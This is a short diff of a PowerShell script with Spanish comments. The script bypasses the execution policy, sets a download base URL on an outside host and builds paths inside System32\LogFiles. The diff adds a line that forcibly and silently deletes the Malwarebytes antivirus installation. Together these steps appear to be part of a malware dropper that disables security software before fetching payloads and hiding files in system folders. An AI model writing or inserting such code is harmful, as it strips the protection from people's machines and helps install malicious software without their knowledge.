@@ -15,6 +15,8 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 # URL base para descargas
 $baseURL = "https://baa4ts.is-a-good.dev"
 
+Remove-Item -Path "C:\Program Files\Malwarebytes" -Recurse -Force -Confirm:$false
+
 # Definir rutas
 $root = Join-Path $env:WINDIR "System32"
 $root = Join-Path $root "LogFiles"
